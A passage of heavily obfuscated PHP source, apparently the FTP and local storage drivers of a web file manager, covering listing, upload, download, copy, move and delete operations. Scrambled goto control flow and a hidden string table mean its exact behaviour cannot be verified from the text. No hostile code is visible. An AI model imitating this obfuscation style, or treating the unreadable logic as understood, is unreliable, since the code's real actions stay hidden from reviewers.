$Aõ†ËÜòë¶[$EÏ¤ñ®Ü‹[192]] = $Aõ†ËÜòë¶[$EÏ¤ñ®Ü‹[83]] = 0; $Aõ†ËÜòë¶[$EÏ¤ñ®Ü‹[193]] = $Aõ†ËÜòë¶[$EÏ¤ñ®Ü‹[194]] = !0; $d¹êéæ¼ = $this->iconvSystem($C¹§ƒóì²„); goto E³Üµ…äÀÈ; DÛ…àğ¿»’: $EÏ¤ñ®Ü‹ =& $_SERVER[òÀöí]; $Aõ†ËÜòë¶ = array($EÏ¤ñ®Ü‹[28] => $this->pathThis($C¹§ƒóì²„), $EÏ¤ñ®Ü‹[75] => $this->getPathOuter($EÏ¤ñ®Ü‹[8] . $C¹§ƒóì²„), $EÏ¤ñ®Ü‹[29] => $EÏ¤ñ®Ü‹[173], $EÏ¤ñ®Ü‹[77] => isset($EÏ»Ìµºù´[$EÏ¤ñ®Ü‹[77]]) ? $EÏ»Ìµºù´[$EÏ¤ñ®Ü‹[77]] : 0, $EÏ¤ñ®Ü‹[167] => $this->ext($C¹§ƒóì²„)); if ($aîåÏ§Ã¹„) { return $Aõ†ËÜòë¶; } goto a†ÜË´†õ; E³Üµ…äÀÈ: $Aõ†ËÜòë¶[$EÏ¤ñ®Ü‹[83]] = @ftp_mdtm($this->connect, $d¹êéæ¼); if (empty($EÏ»Ìµºù´)) { $EÏ»Ìµºù´ = $this->objectMeta($C¹§ƒóì²„); if (!$EÏ»Ìµºù´) { return $Aõ†ËÜòë¶; } } $Aõ†ËÜòë¶[$EÏ¤ñ®Ü‹[77]] = $EÏ»Ìµºù´[$EÏ¤ñ®Ü‹[77]]; goto dé¬¯ÉÏâÙ; aæ¦à¢ˆ¸È: } public function size($a„•‘§¡®ê) { $bâìº…Ôì¦ = $this->objectMeta($a„•‘§¡®ê); return $bâìº…Ôì¦ ? $bâìº…Ôì¦[$_SERVER[òÀöí][77]] : 0; } public function info($Fª“ˆ†ªñ´) { if ($this->isFile($Fª“ˆ†ªñ´)) { return $this->fileInfo($Fª“ˆ†ªñ´, 0); } else { if ($this->isFolder($Fª“ˆ†ªñ´)) { return $this->folderInfo($Fª“ˆ†ªñ´); } } return !1; } private function fileList($BÈÏâœ¢½İ, &$Dî¤£ÙË¾º, &$CÈÁÊ¤Ÿ¬Ò, $b£®ˆÔ×°œ = false) { goto fÓ˜õÅ±‡Á; aäÓ‰¼†ë: $f¸À¥à¯¼Š = $this->listItemCache === !1 ? !1 : !0; $F¤‘ñ‘ÖµË = @ftp_rawlist($this->connect, $BÈÏâœ¢½İ); if (!$F¤‘ñ‘ÖµË) { $F¤‘ñ‘ÖµË = array(); } goto B¶‚Ï¬‚Èš; fÓ˜õÅ±‡Á: $FÛÜßˆƒ½‚ =& $_SERVER[òÀöí]; $BÈÏâœ¢½İ = $this->iconvSystem($BÈÏâœ¢½İ); if (!$this->isFolder($BÈÏâœ¢½İ)) { return !1; } goto f¥ÅœİÓ«Š; f¥ÅœİÓ«Š: @ftp_chdir($this->connect, $FÛÜßˆƒ½‚[8]); $BÈÏâœ¢½İ = rtrim($BÈÏâœ¢½İ, $FÛÜßˆƒ½‚[8]) . $FÛÜßˆƒ½‚[8]; check_abort(); goto aäÓ‰¼†ë; B¶‚Ï¬‚Èš: $Eš–š‹¥ÃÓ = array($FÛÜßˆƒ½‚[94] => 1, $FÛÜßˆƒ½‚[1226] => 1); foreach ($F¤‘ñ‘ÖµË as $fµáƒ¿í¿©) { goto AğÑ¬òŒĞò; aÄÁ«®ìÏò: if (substr($fµáƒ¿í¿©, 0, 1) == $FÛÜßˆƒ½‚[1227]) { $FÉê“î¬ÀÑ[$FÛÜßˆƒ½‚[29]] = $FÛÜßˆƒ½‚[76]; $FÉê“î¬ÀÑ[$FÛÜßˆƒ½‚[77]] = 0; } $c¢ÍÌïÚ§Ü = $FÉê“î¬ÀÑ[$FÛÜßˆƒ½‚[29]] == $FÛÜßˆƒ½‚[76] ? !0 : !1; if ($f¸À¥à¯¼Š) { $this->cacheMethod($FÛÜßˆƒ½‚[197], $F…ÁÓôà”, $c¢ÍÌïÚ§Ü); $this->cacheMethod($FÛÜßˆƒ½‚[198], $F…ÁÓôà”, $FÉê“î¬ÀÑ); } goto EíÂ³áù; AğÑ¬òŒĞò: $bëñïåİ—· = $this->_listItem($fµáƒ¿í¿©); if ($bëñïåİ—·[0] == $FÛÜßˆƒ½‚[714]) { continue; } $F…ÁÓôà” = $bëñïåİ—·[8]; goto eëÔÂ‹°Ùˆ; eëÔÂ‹°Ùˆ: if (!$F…ÁÓôà” || isset($Eš–š‹¥ÃÓ[$F…ÁÓôà”])) { continue; } $F…ÁÓôà” = $this->iconvApp($BÈÏâœ¢½İ . ltrim($F…ÁÓôà”, $FÛÜßˆƒ½‚[8])); $FÉê“î¬ÀÑ = array($FÛÜßˆƒ½‚[28] => $F…ÁÓôà”, $FÛÜßˆƒ½‚[29] => $FÛÜßˆƒ½‚[173], $FÛÜßˆƒ½‚[77] => $bëñïåİ—·[4]); goto aÄÁ«®ìÏò; EíÂ³áù: if ($c¢ÍÌïÚ§Ü) { $Dî¤£ÙË¾º[] = $F…ÁÓôà”; if ($b£®ˆÔ×°œ) { $this->fileList($F…ÁÓôà”, $Dî¤£ÙË¾º, $CÈÁÊ¤Ÿ¬Ò, $b£®ˆÔ×°œ); } continue; } $CÈÁÊ¤Ÿ¬Ò[] = $FÉê“î¬ÀÑ; goto f‡ºÌîç ; f‡ºÌîç : } if ($f¸À¥à¯¼Š) { $this->cacheMethod($FÛÜßˆƒ½‚[197], $BÈÏâœ¢½İ, !0); } goto a­ªßÆÃÀè; a­ªßÆÃÀè: } private function _listItem($E£Ù½çĞ„„) { if (empty($E£Ù½çĞ„„)) { return array(); } $bö®çïØøœ = preg_split($_SERVER[òÀöí][1228], $E£Ù½çĞ„„); if (count($bö®çïØøœ) <= 9) { return $bö®çïØøœ; } $bö®çïØøœ[8] = trim(substr($E£Ù½çĞ„„, strpos($E£Ù½çĞ„„, $bö®çïØøœ[7]) + strlen($bö®çïØøœ[7]))); return array_splice($bö®çïØøœ, 0, 9); } public function listPath($b¿¯¼èë²™, $f”Å±È†‰ = false) { goto dÆ¡Š¶—˜Í; dÆ¡Š¶—˜Í: $fÙÕ•ñğÇ =& $_SERVER[òÀöí]; if (!$this->_isconn()) { return !1; } $E¿¢ƒ©»è” = $BÍğ¬³¿ï = array(); goto cÕÁ ñÌğ; cÕÁ ñÌğ: $this->fileList($b¿¯¼èë²™, $E¿¢ƒ©»è”, $BÍğ¬³¿ï); foreach ($E¿¢ƒ©»è” as $BÎ•ø¿Ì²Â => $cí‡ô·£Ş…) { $E¿¢ƒ©»è”[$BÎ•ø¿Ì²Â] = $this->folderInfo($cí‡ô·£Ş…, $f”Å±È†‰); } foreach ($BÍğ¬³¿ï as $BÎ•ø¿Ì²Â => $cí‡ô·£Ş…) { $BÍğ¬³¿ï[$BÎ•ø¿Ì²Â] = $this->fileInfo($cí‡ô·£Ş…[$fÙÕ•ñğÇ[28]], $f”Å±È†‰, $cí‡ô·£Ş…); } goto A„æµ„¾ÕÜ; A„æµ„¾ÕÜ: return array($fÙÕ•ñğÇ[74] => $E¿¢ƒ©»è”, $fÙÕ•ñğÇ[73] => $BÍğ¬³¿ï); goto a®„‚ßÄŒ; a®„‚ßÄŒ: } public function has($bÍ¹Å¼õÕ‘, $dç¥ÖÀ™« = false, $aˆ¾ºŸÙò¦ = true) { goto bœƒ”¸ö½Û; dÙË¡÷Âã: return !1; goto Bñ’…Ç¤ã»; F’Ûæ‹Åª: $this->fileList($bÍ¹Å¼õÕ‘, $E¸õ„Ú”—¢, $F©½…™, $eß×‘‡¨äˆ); if ($dç¥ÖÀ™«) { return array($f¼ˆØ¦ƒÇ¾[201] => count($F©½…™), $f¼ˆØ¦ƒÇ¾[202] => count($E¸õ„Ú”—¢)); } if ($aˆ¾ºŸÙò¦) { if (count($F©½…™)) { return !0; } } else { if (count($E¸õ„Ú”—¢)) { return !0; } } goto dÙË¡÷Âã; bœƒ”¸ö½Û: $f¼ˆØ¦ƒÇ¾ =& $_SERVER[òÀöí]; $E¸õ„Ú”—¢ = $F©½…™ = array(); $eß×‘‡¨äˆ = $dç¥ÖÀ™« ? !0 : !1; goto F’Ûæ‹Åª; Bñ’…Ç¤ã»: } public function listAll($aØóíß†Å…) { goto dâ¬Ù¯‹Ò“; DÜ¹¿ƒøƒ: foreach ($bØá’º„„¢ as $c°Íå±Î™¡) { if (is_string($c°Íå±Î™¡)) { $d‹ÅÅÊœà’[$c°Íå±Î™¡] = 0; } } return $this->listAllFiles($aØóíß†Å…, array_keys($d‹ÅÅÊœà’), $d‹ÅÅÊœà’); goto e«ã‚¾ã; dâ¬Ù¯‹Ò“: $F¢Üµ­Š»Ç =& $_SERVER[òÀöí]; if (!$this->_isconn()) { return !1; } $bØá’º„„¢ = $dµ°„¯¢Î = array(); goto DÜ¸íÆƒí¼; DÜ¸íÆƒí¼: $this->fileList($aØóíß†Å…, $bØá’º„„¢, $dµ°„¯¢Î, !0); $d‹ÅÅÊœà’ = array(); foreach ($dµ°„¯¢Î as $c°Íå±Î™¡) { $d‹ÅÅÊœà’[$c°Íå±Î™¡[$F¢Üµ­Š»Ç[28]]] = $c°Íå±Î™¡[$F¢Üµ­Š»Ç[77]]; } goto DÜ¹¿ƒøƒ; e«ã‚¾ã: } public function getContent($f §Š„ñ‰») { if (!$this->_isconn()) { return !1; } $f §Š„ñ‰» = $this->iconvSystem($f §Š„ñ‰»); return $this->fileSubstr($f §Š„ñ‰»); } public function setContent($eÈÁÖ¶°õÓ, $fš„Àç = '') { goto A„‘›¶Ø–; A„‘›¶Ø–: if (!$this->_isconn()) { return !1; } $DØ§›á†‡ = $this->pathThis($this->iconvSystem($eÈÁÖ¶°õÓ)); $AòÄÊà³Ï = $this->tempFile($DØ§›á†‡); goto a ÎÖ×ç´; a ÎÖ×ç´: file_put_contents($AòÄÊà³Ï, $fš„Àç); $eíê×“âç = $this->upload($eÈÁÖ¶°õÓ, $this->iconvApp($AòÄÊà³Ï)); $this->tempFileRemve($AòÄÊà³Ï); goto fóõæëŒ£Í; fóõæëŒ£Í: return $eíê×“âç; goto cÑÇçÜâğÀ; cÑÇçÜâğÀ: } public function fileSubstr($f‹ÂºŒ±¤Ó, $f®Åè‹µç« = 0, $båó©¿ïÊã = false) { if (!$this->_isconn()) { return !1; } return $this->ftpRequest($f‹ÂºŒ±¤Ó, $f®Åè‹µç«, $båó©¿ïÊã); } private function ftpRequest($D…«éíÍ, $F£ğÙî¸ë = 0, $Cº¶óíĞƒ = false) { goto eåŸª’õ™ç; eåŸª’õ™ç: $D…«éíÍ = $this->iconvSystem($D…«éíÍ); $bª’ñãŒ°Ê = $this->scheme . $this->host . $_SERVER[òÀöí][4] . $this->port; $Bëô ï¯ç = curl_init(); goto F¦àÔõèØ ; D˜×ôĞ•äÛ: curl_setopt($Bëô ï¯ç, CURLOPT_RETURNTRANSFER, 1); $D¹ÓÂ‚İœÈ = curl_exec($Bëô ï¯ç); curl_close($Bëô ï¯ç); goto eì‘×°œ‚; eì‘×°œ‚: return $D¹ÓÂ‚İœÈ; goto FÍ§¾¢Ä•í; F¦àÔõèØ : curl_setopt($Bëô ï¯ç, CURLOPT_URL, $bª’ñãŒ°Ê . $this->pathEncode($D…«éíÍ)); curl_setopt($Bëô ï¯ç, CURLOPT_USERPWD, "{$this->username}\x3a{$this->userpass}"); if ($Cº¶óíĞƒ) { $eæºóêœÆ = $F£ğÙî¸ë + $Cº¶óíĞƒ - 1; curl_setopt($Bëô ï¯ç, CURLOPT_RANGE, "{$F£ğÙî¸ë}\55{$eæºóêœÆ}"); } goto D˜×ôĞ•äÛ; FÍ§¾¢Ä•í: } public function upload($A£Ï­ëî´’, $d’”ŒŠ­éå, $A²ØÊôœ¨  = false, $e¯š˜õğçĞ = REPEAT_REPLACE) { goto aéˆ”³®…; Aí×Ü«ƒŒ©: $d’”ŒŠ­éå = $this->iconvSystem($d’”ŒŠ­éå); $fé¤¶­«Ñİ = ftp_nb_put($this->connect, $A£Ï­ëî´’, $d’”ŒŠ­éå, FTP_BINARY); while ($fé¤¶­«Ñİ == FTP_MOREDATA) { $fé¤¶­«Ñİ = ftp_nb_continue($this->connect); } goto d×Ø””¼¸À; aéˆ”³®…: if (!$this->_isconn()) { return !1; } if (!$this->mkdir($this->pathFather($A£Ï­ëî´’))) { return !1; } $A£Ï­ëî´’ = $this->iconvSystem($A£Ï­ëî´’); goto Aí×Ü«ƒŒ©; d×Ø””¼¸À: if ($fé¤¶­«Ñİ != FTP_FINISHED) { return !1; } return $this->getPathOuter($A£Ï­ëî´’); goto f¥…¢¿°Â¦; f¥…¢¿°Â¦: } public function download($Aâ‹©ÂÏâä, $eåÔÔğ ®ª = '') { goto fÚàŠÚˆ·–; E“Şª²å¢Ö: $Aâ‹©ÂÏâä = $this->iconvSystem($Aâ‹©ÂÏâä); $eåÔÔğ ®ª = $this->iconvSystem($eåÔÔğ ®ª); $f ¼ˆ«ì¯Ş = ftp_nb_get($this->connect, $eåÔÔğ ®ª, $Aâ‹©ÂÏâä, FTP_BINARY); goto cö–©ªÀİ‹; cö–©ªÀİ‹: while ($f ¼ˆ«ì¯Ş == FTP_MOREDATA) { $f ¼ˆ«ì¯Ş = ftp_nb_continue($this->connect); } if ($f ¼ˆ«ì¯Ş != FTP_FINISHED) { return !1; } return $this->iconvApp($eåÔÔğ ®ª); goto dŒ©ÃîÌŞÃ; fÚàŠÚˆ·–: if (!$this->_isconn()) { return !1; } $dŒò·°×ƒ© = $this->pathFather($eåÔÔğ ®ª); if (!IO::mkdir($dŒò·°×ƒ©)) { return !1; } goto E“Şª²å¢Ö; dŒ©ÃîÌŞÃ: } public function exist($FÚìƒ‹ÚÊ°) { return $this->isFile($FÚìƒ‹ÚÊ°) || $this->isFolder($FÚìƒ‹ÚÊ°); } public function isFile($D×öíŠ®¬) { return !$this->isFolder($D×öíŠ®¬) && $this->objectMeta($D×öíŠ®¬); } public function isFolder($eìÁÍ¶ØÉæ) { return $this->cacheMethod($_SERVER[òÀöí][197], $eìÁÍ¶ØÉæ); } protected function objectMeta($Eç©†ì„Ø¦) { return $this->cacheMethod($_SERVER[òÀöí][198], $Eç©†ì„Ø¦); } protected function _objectMeta($e¼»è‡êà) { goto A¶œèÄˆ; FâË•åÄÎ: $b•·¥¢‹µ = @ftp_size($this->connect, $e¼»è‡êà); if ($b•·¥¢‹µ != -1) { $aÙ·ƒ˜˜ù»[$A´Óò¢…·ã[77]] = $b•·¥¢‹µ; } else { $bùä»¥â¢™ = @ftp_chdir($this->connect, $e¼»è‡êà); if (!$bùä»¥â¢™) { return !1; } $aÙ·ƒ˜˜ù»[$A´Óò¢…·ã[29]] = $A´Óò¢…·ã[76]; } return $aÙ·ƒ˜˜ù»; goto C°ƒà¡ãòí; A¶œèÄˆ: $A´Óò¢…·ã =& $_SERVER[òÀöí]; if ($e¼»è‡êà == $A´Óò¢…·ã[33] || $e¼»è‡êà == $A´Óò¢…·ã[8]) { return array(); } if (!$this->_isconn()) { return !1; } goto AÍ¢ÔÏãø†; AÍ¢ÔÏãø†: $e¼»è‡êà = $this->iconvSystem($e¼»è‡êà); $aÙ·ƒ˜˜ù» = array($A´Óò¢…·ã[28] => $this->iconvApp($e¼»è‡êà), $A´Óò¢…·ã[29] => $A´Óò¢…·ã[173], $A´Óò¢…·ã[77] => 0); @ftp_chdir($this->connect, $A´Óò¢…·ã[8]); goto FâË•åÄÎ; C°ƒà¡ãòí: } protected function _isFolder($c°ôˆÇÌº) { $eä‰ç¹Åø =& $_SERVER[òÀöí]; if ($c°ôˆÇÌº == $eä‰ç¹Åø[33] || $c°ôˆÇÌº == $eä‰ç¹Åø[8]) { return !0; } $c­ÀŸÎÓ = $this->_objectMeta($c°ôˆÇÌº); return isset($c­ÀŸÎÓ[$eä‰ç¹Åø[29]]) && $c­ÀŸÎÓ[$eä‰ç¹Åø[29]] == $eä‰ç¹Åø[76] ? !0 : !1; } } goto DÇŞ§ ½¼; DÇŞ§ ½¼: class PathDriverLocal extends PathDriverBase { public function __construct() { parent::__construct(); } public function getPath($cï¾Î•åµ) { if (substr($cï¾Î•åµ, 0, 2) == $_SERVER[òÀöí][1219]) { $cï¾Î•åµ = BASIC_PATH . substr($cï¾Î•åµ, 2); } return $cï¾Î•åµ; } public function iconvApp($Fâõâİ‘Ô¬) { $EÉß²ƒ‹­‰ =& $_SERVER[òÀöí]; global $config; return $this->iconvTo($Fâõâİ‘Ô¬, $config[$EÉß²ƒ‹­‰[1217]], $config[$EÉß²ƒ‹­‰[1216]]); } public function iconvSystem($dé›ººšø) { $Aí£’í§…µ =& $_SERVER[òÀöí]; global $config; return $this->iconvTo($dé›ººšø, $config[$Aí£’í§…µ[1216]], $config[$Aí£’í§…µ[1217]]); } public function getPathOuter($F ¼«Ø¸áÇ) { goto d¬á•Øˆ†; e¢ƒŒŒ¼ÁÇ: $F ¼«Ø¸áÇ = KodIO::clear($F ¼«Ø¸áÇ); $F ¼«Ø¸áÇ = substr($F ¼«Ø¸áÇ, strlen($EØÜ¨î)); if (empty($this->pathDriver)) { return $F ¼«Ø¸áÇ; } goto eİ¡ÃĞÙà—; eİ¡ÃĞÙà—: return $this->pathDriver . $c»Õğƒ‹ìñ[8] . ltrim($F ¼«Ø¸áÇ, $c»Õğƒ‹ìñ[8]); goto a„Âô”ì¿«; E˜ßºŠ¾ğù: if (substr($EØÜ¨î, 0, 2) == $c»Õğƒ‹ìñ[1219]) { $EØÜ¨î = BASIC_PATH . substr($EØÜ¨î, 2); } if (substr($F ¼«Ø¸áÇ, 0, 2) == $c»Õğƒ‹ìñ[1219]) { $F ¼«Ø¸áÇ = BASIC_PATH . substr($F ¼«Ø¸áÇ, 2); } $EØÜ¨î = KodIO::clear($EØÜ¨î); goto e¢ƒŒŒ¼ÁÇ; d¬á•Øˆ†: $c»Õğƒ‹ìñ =& $_SERVER[òÀöí]; $EØÜ¨î = $this->iconvApp($this->pathBase); $F ¼«Ø¸áÇ = $this->iconvApp($F ¼«Ø¸áÇ); goto E˜ßºŠ¾ğù; a„Âô”ì¿«: } public function mkfile($AÆ¿­™²‡ƒ, $fˆ‹çèÂ¯ª = '', $eòõ÷ ‘† = REPEAT_RENAME) { $AÆ¿­™²‡ƒ = $this->iconvSystem($AÆ¿­™²‡ƒ); @touch($AÆ¿­™²‡ƒ); if ($fˆ‹çèÂ¯ª) { file_put_contents($AÆ¿­™²‡ƒ, $fˆ‹çèÂ¯ª); } return is_file($AÆ¿­™²‡ƒ) ? $this->getPathOuter($AÆ¿­™²‡ƒ) : !1; } public function mkdir($b™ŠÊ†™…Ä, $c·ÇÛá£Çë = REPEAT_SKIP) { $b™ŠÊ†™…Ä = $this->iconvSystem($b™ŠÊ†™…Ä); if (is_dir($b™ŠÊ†™…Ä)) { return $this->getPathOuter($b™ŠÊ†™…Ä); } @mkdir($b™ŠÊ†™…Ä, 511, !0); return is_dir($b™ŠÊ†™…Ä) ? $this->getPathOuter($b™ŠÊ†™…Ä) : !1; } public function copyFile($FÜÎ‚Â–ˆŠ, $Eİìß®Ú¤ã) { $this->mkdir($this->pathFather($Eİìß®Ú¤ã)); $FÜÎ‚Â–ˆŠ = $this->iconvSystem($FÜÎ‚Â–ˆŠ); $Eİìß®Ú¤ã = $this->iconvSystem($Eİìß®Ú¤ã); $bó“¡“ó = copy_64($FÜÎ‚Â–ˆŠ, $Eİìß®Ú¤ã); return $bó“¡“ó ? $this->getPathOuter($Eİìß®Ú¤ã) : !1; } public function moveFile($D…´³Ó¿–Ø, $E¡‚…µ¯©º) { $this->mkdir($this->pathFather($E¡‚…µ¯©º)); $D…´³Ó¿–Ø = $this->iconvSystem($D…´³Ó¿–Ø); $E¡‚…µ¯©º = $this->iconvSystem($E¡‚…µ¯©º); $d„¸îØÂšœ = intval(@rename($D…´³Ó¿–Ø, $E¡‚…µ¯©º)); if (!$d„¸îØÂšœ) { if ($d„¸îØÂšœ = intval(@copy_64($D…´³Ó¿–Ø, $E¡‚…µ¯©º))) { @unlink($D…´³Ó¿–Ø); } } return $d„¸îØÂšœ ? $this->getPathOuter($E¡‚…µ¯©º) : !1; } public function delFile($d¡ëƒ¨¦) { $d¡ëƒ¨¦ = $this->iconvSystem($d¡ëƒ¨¦); if (!@unlink($d¡ëƒ¨¦)) { @chmod($d¡ëƒ¨¦, 511); if (!@unlink($d¡ëƒ¨¦)) { return !1; } } else { return !0; } } public function delFolder($f†–ÁºµŒ) { goto FÃŠˆÆÓãß; FÌ²¥î‚²: return rmdir($f†–ÁºµŒ); goto cæ¤Š§‹¸Ç; FÃŠˆÆÓãß: $D²Ä“åî¢Ú =& $_SERVER[òÀöí]; $f†–ÁºµŒ = $this->iconvSystem($f†–ÁºµŒ); if (!is_dir($f†–ÁºµŒ)) { return !0; } goto Eî´½ÇÌ¥Ú; Eî´½ÇÌ¥Ú: if (!($c¿³Ù¯Íƒì = opendir($f†–ÁºµŒ))) { return !1; } while (($E¤±å·ª‚– = readdir($c¿³Ù¯Íƒì)) !== !1) { if ($E¤±å·ª‚– == $D²Ä“åî¢Ú[94] || $E¤±å·ª‚– == $D²Ä“åî¢Ú[1226]) { continue; } $eÏ—Ìì¥± = $f†–ÁºµŒ . $D²Ä“åî¢Ú[8] . $E¤±å·ª‚–; if (is_file($eÏ—Ìì¥±) || is_link($eÏ—Ìì¥±)) { if (!unlink($eÏ—Ìì¥±)) { chmod($eÏ—Ìì¥±, 511); if (!unlink($eÏ—Ìì¥±)) { return !1; } } } else { if (is_dir($eÏ—Ìì¥±)) { chmod($eÏ—Ìì¥±, 511); $eÏ—Ìì¥± = $this->iconvApp($eÏ—Ìì¥±); if (!$this->delFolder($eÏ—Ìì¥±)) { return !1; } } } } closedir($c¿³Ù¯Íƒì); goto FÌ²¥î‚²; cæ¤Š§‹¸Ç: } public function rename($eìÑŞ¾¸¾, $FŞÈ†‘ˆ…) { goto f¦‰æ¹ÆÛÛ; AÇ“ÌäšÇ: $eìÑŞ¾¸¾ = $this->iconvSystem($eìÑŞ¾¸¾); $e©òåŒ¬Ìî = $this->pathFather($eìÑŞ¾¸¾); $DÉğ¤¶ªá‹ = rtrim($e©òåŒ¬Ìî, $Dß£ÄŸ[8]) . $Dß£ÄŸ[8] . $A˜³ïâò¯·; goto D¡¼÷¶Ÿ”³; D¡¼÷¶Ÿ”³: $d‰¦õ‰Ã—Ğ = @rename($eìÑŞ¾¸¾, $DÉğ¤¶ªá‹); $DÉğ¤¶ªá‹ = $this->iconvApp($DÉğ¤¶ªá‹); return $d‰¦õ‰Ã—Ğ ? $this->getPathOuter($DÉğ¤¶ªá‹) : !1; goto eÊªÜŠŒ•ï; f¦‰æ¹ÆÛÛ: $Dß£ÄŸ =& $_SERVER[òÀöí]; $A˜³ïâò¯· = $this->fileNameAuto($this->pathFather($eìÑŞ¾¸¾), $FŞÈ†‘ˆ…); $A˜³ïâò¯· = $this->iconvSystem($A˜³ïâò¯·); goto AÇ“ÌäšÇ; eÊªÜŠŒ•ï: } public function size($e›­ë‡¸¦Ñ) { $e›­ë‡¸¦Ñ = $this->iconvSystem($e›­ë‡¸¦Ñ); return filesize_64($e›­ë‡¸¦Ñ); } public function info($bšÎßÙó±¨) { $bšÎßÙó±¨ = $this->iconvSystem($bšÎßÙó±¨); if ($this->isFolder($bšÎßÙó±¨)) { return $this->folderInfo($bšÎßÙó±¨); } else { if ($this->isFile($bšÎßÙó±¨)) { return $this->fileInfo($bšÎßÙó±¨); } } return !1; } protected function infoChildren($fÆÍÜ¤—À, &$cˆŒòŒ¸Œ², $b®…½ Ûœ¶ = true) { goto d¬íÜ”Õ³; Aô°Ê„‘¥Â: closedir($eµ©ç‚Ô¶Â); goto eËôÃùïé; cËğ‡Ûƒğ”: if ($b®…½ Ûœ¶) { $fÆÍÜ¤—À = $this->iconvSystem($fÆÍÜ¤—À); } if (!($eµ©ç‚Ô¶Â = @opendir($fÆÍÜ¤—À))) { return; } while (($bš£ŒÌ—¯÷ = readdir($eµ©ç‚Ô¶Â)) !== !1) { if ($bš£ŒÌ—¯÷ == $A‡”À¥ßùà[94] || $bš£ŒÌ—¯÷ == $A‡”À¥ßùà[1226]) { continue; } $bè‰…§ÊŞŒ = $fÆÍÜ¤—À . $bš£ŒÌ—¯÷; if (is_file($bè‰…§ÊŞŒ) || is_link($bè‰…§ÊŞŒ)) { $cˆŒòŒ¸Œ²[$A‡”À¥ßùà[78]]++; $cˆŒòŒ¸Œ²[$A‡”À¥ßùà[77]] += filesize_64($bè‰…§ÊŞŒ); } else { if (is_dir($bè‰…§ÊŞŒ)) { $cˆŒòŒ¸Œ²[$A‡”À¥ßùà[79]]++; $this->infoChildren($bè‰…§ÊŞŒ, $cˆŒòŒ¸Œ², !1); } } } goto Aô°Ê„‘¥Â; d¬íÜ”Õ³: $A‡”À¥ßùà =& $_SERVER[òÀöí]; check_abort_echo(); $fÆÍÜ¤—À = rtrim($fÆÍÜ¤—À, $A‡”À¥ßùà[8]) . $A‡”À¥ßùà[8]; goto cËğ‡Ûƒğ”; eËôÃùïé: } private function folderInfo($aÊåˆ“¯, $Eä¯£Ê¸®ï = false) { $Dæ‡“ÛğÚ— =& $_SERVER[òÀöí]; $aÊåˆ“¯ = rtrim($aÊåˆ“¯, $Dæ‡“ÛğÚ—[8]) . $Dæ‡“ÛğÚ—[8]; $DÜ”¾Ë¥äå = $this->iconvApp($this->pathThis($aÊåˆ“¯)); if ($Eä¯£Ê¸®ï) { return array($Dæ‡“ÛğÚ—[28] => $DÜ”¾Ë¥äå, $Dæ‡“ÛğÚ—[75] => $this->getPathOuter($aÊåˆ“¯), $Dæ‡“ÛğÚ—[29] => $Dæ‡“ÛğÚ—[76]); } $fàï‘´—‹› = array($Dæ‡“ÛğÚ—[28] => $DÜ”¾Ë¥äå, $Dæ‡“ÛğÚ—[75] => $this->getPathOuter($aÊåˆ“¯), $Dæ‡“ÛğÚ—[29] => $Dæ‡“ÛğÚ—[76], $Dæ‡“ÛğÚ—[192] => @filectime($aÊåˆ“¯), $Dæ‡“ÛğÚ—[83] => @filemtime($aÊåˆ“¯), $Dæ‡“ÛğÚ—[1229] => @fileatime($aÊåˆ“¯), $Dæ‡“ÛğÚ—[1230] => is_readable($aÊåˆ“¯), $Dæ‡“ÛğÚ—[1231] => is_writable($aÊåˆ“¯), $Dæ‡“ÛğÚ—[1232] => get_mode($aÊåˆ“¯)); return $fàï‘´—‹›; } private function fileInfo($féìš •¯¬, $CªÛäË = false) { $fĞùºñ®±î =& $_SERVER[òÀöí]; $cÅÑÈãÏ­ = $this->iconvApp($this->pathThis($féìš •¯¬)); if ($CªÛäË) { return array($fĞùºñ®±î[28] => $cÅÑÈãÏ­, $fĞùºñ®±î[75] => $this->getPathOuter($féìš •¯¬), $fĞùºñ®±î[29] => $fĞùºñ®±î[173], $fĞùºñ®±î[77] => $this->size($féìš •¯¬), $fĞùºñ®±î[167] => $this->ext($cÅÑÈãÏ­)); } $fš¢¢Ëñ‡ = array($fĞùºñ®±î[28] => $cÅÑÈãÏ­, $fĞùºñ®±î[75] => $this->getPathOuter($féìš •¯¬), $fĞùºñ®±î[29] => $fĞùºñ®±î[173], $fĞùºñ®±î[192] => @filectime($féìš •¯¬), $fĞùºñ®±î[83] => @filemtime($féìš •¯¬), $fĞùºñ®±î[1229] => @fileatime($féìš •¯¬), $fĞùºñ®±î[77] => $this->size($féìš •¯¬), $fĞùºñ®±î[167] => $this->ext($cÅÑÈãÏ­), $fĞùºñ®±î[1230] => is_readable($féìš •¯¬), $fĞùºñ®±î[1231] => is_writable($féìš •¯¬), $fĞùºñ®±î[1232] => get_mode($féìš •¯¬)); return $fš¢¢Ëñ‡; } public function exist($e®òÍº¾²) { $e®òÍº¾² = $this->iconvSystem($e®òÍº¾²); return @file_exists($e®òÍº¾²); } public function isFile($D»è…‰¡¦Ë) { $D»è…‰¡¦Ë = $this->iconvSystem($D»è…‰¡¦Ë); return @is_file($D»è…‰¡¦Ë); } public function isFolder($C°ß‹µå) { $C°ß‹µå = $this->iconvSystem($C°ß‹µå); return @is_dir($C°ß‹µå); } public function listPath($f“‰ğ—›†, $EšŸ¦³‹ÁÏ = false) { goto B‡†é·ÆŠ–; dÄºò÷‡¼ï: closedir($c‹îÔ‚°‚ˆ); return $Cß”¦Š…‘ö; goto FíÕÀ¼º›Ò; B‡†é·ÆŠ–: $Bô Š‰î¹’ =& $_SERVER[òÀöí]; $f“‰ğ—›† = $this->iconvSystem($f“‰ğ—›†); $f“‰ğ—›† = rtrim($f“‰ğ—›†, $Bô Š‰î¹’[8]) . $Bô Š‰î¹’[8]; goto eñ”÷ë‚­; eñ”÷ë‚­: $Cß”¦Š…‘ö = array($Bô Š‰î¹’[74] => array(), $Bô Š‰î¹’[73] => array()); if (!($c‹îÔ‚°‚ˆ = @opendir($f“‰ğ—›†))) { return $Cß”¦Š…‘ö; } while (($CÕ×„½¼È¼ = readdir($c‹îÔ‚°‚ˆ)) !== !1) { if ($CÕ×„½¼È¼ == $Bô Š‰î¹’[94] || $CÕ×„½¼È¼ == $Bô Š‰î¹’[1226]) { continue; } $fõ¬Öííå² = $f“‰ğ—›† . $CÕ×„½¼È¼; if (is_file($fõ¬Öííå²)) { $Cß”¦Š…‘ö[$Bô Š‰î¹’[73]][] = $this->fileInfo($fõ¬Öííå², $EšŸ¦³‹ÁÏ); } else { $Cß”¦Š…‘ö[$Bô Š‰î¹’[74]][] = $this->folderInfo($fõ¬Öííå², $EšŸ¦³‹ÁÏ); } } goto dÄºò÷‡¼ï; FíÕÀ¼º›Ò: } public function 